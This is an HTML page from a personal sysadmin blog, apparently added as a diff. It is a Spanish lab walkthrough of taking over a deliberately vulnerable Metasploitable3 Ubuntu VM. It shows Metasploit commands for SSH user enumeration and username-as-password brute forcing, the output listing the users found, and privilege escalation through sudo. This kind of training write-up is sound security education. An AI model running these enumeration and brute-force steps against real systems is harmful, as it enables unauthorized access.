@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+    <meta name="color-scheme" content="light dark">
+
+    
+
+    <meta name="author" content="Daniel Parrales">
+    <meta name="description" content="Tomar el control de la máquina Ubuntu de Metasploitable3 a través de un ataque de fuerza bruta por SSH    En esta parte vamos a utilizar una máquina con sistema operativo Kali Linux para tomar el control de una máquina Ubuntu creada a través de “Metasploitable3”, por lo que ha sido creada con multitud de vulnerabilidades que podremos aprovechar. En este caso en concreto, he optado por usar un ataque de fuerza bruta para conectarme por ssh a la máquina y una vez dentro escalar privilegios para convertirme en root, obteniendo así el control total de la máquina.">
+    <meta name="keywords" content="blog,developer,personal,">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="Tomar el control de la máquina Ubuntu de Metasploitable3 a través de un ataque de fuerza bruta por SSH    En esta parte vamos a utilizar una máquina con sistema operativo Kali Linux para tomar el control de una máquina Ubuntu creada a través de “Metasploitable3”, por lo que ha sido creada con multitud de vulnerabilidades que podremos aprovechar. En este caso en concreto, he optado por usar un ataque de fuerza bruta para conectarme por ssh a la máquina y una vez dentro escalar privilegios para convertirme en root, obteniendo así el control total de la máquina."/>
+
+    <meta property="og:title" content="" />
+<meta property="og:description" content="Tomar el control de la máquina Ubuntu de Metasploitable3 a través de un ataque de fuerza bruta por SSH    En esta parte vamos a utilizar una máquina con sistema operativo Kali Linux para tomar el control de una máquina Ubuntu creada a través de “Metasploitable3”, por lo que ha sido creada con multitud de vulnerabilidades que podremos aprovechar. En este caso en concreto, he optado por usar un ataque de fuerza bruta para conectarme por ssh a la máquina y una vez dentro escalar privilegios para convertirme en root, obteniendo así el control total de la máquina." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://www.sysadblog.com/posts/metasploitable3/" />
+<meta property="article:published_time" content="2021-10-11T19:32:07+02:00" />
+<meta property="article:modified_time" content="2021-10-11T19:32:07+02:00" />
+
+
+    <title>
+   · Sysadblog
+</title>
+
+    
+      <link rel="canonical" href="http://www.sysadblog.com/posts/metasploitable3/">
+    
+
+    <link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.8e2b2510f60e1715eae08d113a808dcdaf17f6f711edb9e969be38d0074d240d.css" integrity="sha256-jislEPYOFxXq4I0ROoCNza8X9vcR7bnpab440AdNJA0=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css" integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    
+
+    <meta name="generator" content="Hugo 0.80.0" />
+  </head>
+
+  
+  
+    
+  
+  <body class="preload-transitions colorscheme-auto"
+        onload=""
+  >
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      Sysadblog
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/aboutme">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://www.sysadblog.com/posts/metasploitable3/">
+              
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime='2021-10-11T19:32:07&#43;02:00'>
+                October 11, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              9-minute read
+            </span>
+          </div>
+          <div class="authors">
+    <i class="fa fa-user" aria-hidden="true"></i>
+      <a href="/authors/daniel-parrales/">Daniel Parrales</a></div>
+          
+          
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="tomar-el-control-de-la-máquina-ubuntu-de-metasploitable3-a-través-de-un-ataque-de-fuerza-bruta-por-ssh">
+  Tomar el control de la máquina Ubuntu de Metasploitable3 a través de un ataque de fuerza bruta por SSH
+  <a class="heading-link" href="#tomar-el-control-de-la-m%c3%a1quina-ubuntu-de-metasploitable3-a-trav%c3%a9s-de-un-ataque-de-fuerza-bruta-por-ssh">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>En esta parte vamos a utilizar una máquina con sistema operativo Kali Linux para tomar el control de una máquina Ubuntu creada a través de “Metasploitable3”, por lo que ha sido creada con multitud de vulnerabilidades que podremos aprovechar. En este caso en concreto, he optado por usar un ataque de fuerza bruta para conectarme por ssh a la máquina y una vez dentro escalar privilegios para convertirme en root, obteniendo así el control total de la máquina.</p>
+<p>Para ello, lo primero es averiguar si la máquina objetivo tiene el puerto 22 abierto. Lo  comprobamos usando el siguiente comando:</p>
+<p><code>nmap -p 22 192.168.122.254</code></p>
+<p>Obtenemos la siguiente información:</p>
+<p><img src="/images/metasploitable3/nmap_meta.png" alt="nmap_meta.png"></p>
+<p>Como podemos ver, el puerto está abierto. Ahora usaremos un módulo auxiliar que está instalado en Kali Linux para conseguir toda la lista de usuarios que hay creados en la máquina objetivo. Seguimos los siguientes pasos:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">msfconsole
+use auxiliary/scanner/ssh/ssh_enumusers
+set RHOSTS 192.168.122.254
+set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
+run
+</code></pre></div><p>Con esto, tras acabar el módulo, obtenemos la siguiente lista de usuarios:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[*] 192.168.122.254:22 - SSH - Using malformed packet technique
+[*] 192.168.122.254:22 - SSH - Starting scan
+[+] 192.168.122.254:22 - SSH - User &#39;4Dgifts&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;abrt&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;adm&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;admin&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;administrator&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;anon&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;_apt&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;arpwatch&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;auditor&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;avahi&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;avahi-autoipd&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;backup&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;bbs&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;beef-xss&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;bin&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;bitnami&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;checkfs&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;checkfsys&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;checksys&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;chronos&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;chrony&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;cmwlogin&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;cockpit-ws&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;colord&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;couchdb&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;cups-pk-helper&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;daemon&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;dbadmin&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;dbus&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;Debian-exim&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;Debian-snmp&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;demo&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;demos&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;diag&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;distccd&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;dni&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;dnsmasq&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;dradis&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;EZsetup&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;fal&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;fax&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;ftp&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;games&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;gdm&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;geoclue&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;gnats&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;gnome-initial-setup&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;gopher&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;gropher&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;guest&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;haldaemon&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;halt&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;hplip&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;inetsim&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;informix&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;install&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;iodine&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;irc&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;jet&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;karaf&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;kernoops&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;king-phisher&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;landscape&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;libstoragemgmt&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;libuuid&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;lightdm&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;list&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;listen&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;lp&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;lpadm&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;lpadmin&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;lxd&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;lynx&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;mail&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;man&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;me&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;messagebus&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;miredo&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;mountfs&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;mountfsys&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;mountsys&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;mysql&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;news&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;noaccess&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;nobody&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;nobody4&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;ntp&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;nuucp&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;nxautomation&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;nxpgsql&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;omi&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;omsagent&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;operator&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;oracle&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;OutOfBox&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;pi&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;polkitd&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;pollinate&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;popr&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;postfix&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;postgres&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;postmaster&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;printer&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;proxy&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;pulse&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;redsocks&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;rfindd&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;rje&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;root&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;ROOT&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;rooty&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;rpc&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;rpcuser&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;rtkit&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;rwhod&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;saned&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;service&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;setroubleshoot&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;setup&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;sgiweb&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;shutdown&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;sigver&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;speech-dispatcher&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;sshd&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;sslh&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;sssd&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;stunnel4&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;sym&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;symop&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;sync&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;sys&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;sysadm&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;sysadmin&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;sysbin&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;syslog&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;system_admin&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;systemd-bus-proxy&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;systemd-coredump&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;systemd-network&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;systemd-resolve&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;systemd-timesync&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;tcpdump&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;trouble&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;tss&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;udadmin&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;ultra&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;umountfs&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;umountfsys&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;umountsys&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;unix&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;unscd&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;us_admin&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;usbmux&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;user&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;uucp&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;uucpadm&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;uuidd&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;vagrant&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;varnish&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;web&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;webmaster&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;whoopsie&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;www&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;www-data&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;xpdb&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;xpopr&#39; found
+[+] 192.168.122.254:22 - SSH - User &#39;zabbix&#39; found
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre></div><p>Como podemos ver, hay una gran cantidad de usuarios creados en el sistema. El siguiente paso es añadir el nombre de los usuarios en un solo fichero, que será el que usemos para ejecutar el ataque de fuerza bruta. Para ello usamos:</p>
+<p><code>cat listausr.txt | awk '{print $7}' &gt; listafinal.txt</code></p>
+<p>Este comando hará que la lista anterior (que hemos añadido al fichero <em>listausr.txt</em>), se traspase a otro fichero dejando únicamente los usuarios (es posible que haya que eliminar las comillas que queden).</p>
+<p>Obtenido el fichero <em>listafinal.txt</em>, haremos uso de otro módulo de Kali Linux que nos permitirá realizar el ataque de fuerza bruta a través de ssh. Para la ejecución del ataque seguiremos los siguientes pasos:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">msfconsole
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.122.254
+set USER_AS_PASS true
+set USER_FILE /home/kali/listafinal.txt
+run
+</code></pre></div><p>Tras un tiempo (dependerá de los recursos de nuestra máquina), obtendremos lo siguiente, ya que metasploitable ha creado un usuario  vagrant con la contraseña vagrant:</p>
+<p><img src="/images/metasploitable3/contra_meta.png" alt="contra_meta.png"></p>
+<p>Como podemos ver, nos ha indicado que el usuario vagrant tiene la contraseña vagrant. A partir de aquí tenemos dos opciones para conectarnos a la máquina objetivo. La primera es una conexión ssh normal, ya que sabemos el nombre de usuario y la contraseña. La segunda es hacer uso de una sesión que nos ha creado Kali Linux automáticamente al encontrar la contraseña. Yo he optado por la segunda.
+Así pues ejecutamos:</p>
+<p><code>sessions -i 1</code></p>
+<p><img src="/images/metasploitable3/sesion1.png" alt="sesion1.png"></p>
+<p>Una vez hemos accedido a la máquina, podemos ejecutar comandos como lo haríamos en nuestra máquina. Yo he ejecutado el comando <em>“id”</em>, para comprobar que he entrado como <em>“vagrant”</em>. Además con este comando podemos comprobar que el usuario <em>&ldquo;vagrant&rdquo;</em> está dentro del grupo de <em>“sudoers”</em>, lo que nos da la posibilidad de ejecutar comandos como si fuéramos <em>&ldquo;root&rdquo;</em>. Una vez llegados hasta este punto, ya tendríamos el control de la máquina, pero podemos asegurarnos de ello si intentamos ponernos como root usando un <em>“sudo su”</em>.</p>
+<p><img src="/images/metasploitable3/root_meta.png" alt="root_meta.png"></p>
+<p>Al ejecutar ese comando, nos hemos convertido en el usuario root de la máquina, por lo que ahora sí, ya podemos ejecutar cualquier comando en la máquina, cambiar las contraseñas o cambiar lo que queramos dentro de la misma. Ahora ya podemos decir que tenemos el control total de la máquina.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      
+  <footer class="footer">
+    <section class="container">
+      
+        <p>El camino a la locura de un sysadmin</p>
+      
+      
+        ©
+        
+        2021
+         Daniel Parrales 
+      
+      
+         · 
+        Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+      
+      
+    </section>
+  </footer>
+
+
+    </main>
+
+    
+      
+      <script src="/js/coder.min.a350362441276ec5c1671926420497bb8e52b63ead1d51d3c9bc4342d0039526.js" integrity="sha256-o1A2JEEnbsXBZxkmQgSXu45Stj6tHVHTybxDQtADlSY="></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+  </body>
+
+</html>
